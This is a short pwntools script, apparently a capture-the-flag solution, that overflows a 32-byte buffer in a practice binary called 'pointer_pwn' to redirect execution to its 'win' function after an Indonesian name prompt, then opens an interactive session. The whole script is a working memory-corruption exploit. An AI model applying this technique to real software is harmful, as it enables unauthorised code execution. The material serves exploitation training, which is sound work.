from pwn import *

elf = ELF('pointer_pwn')
io = process('./pointer_pwn')

offset = 32
payload = b'A' * offset

payload += p64(elf.symbols['win'])
io.sendlineafter(b"Masukkan namamu: ", payload)
io.interactive()
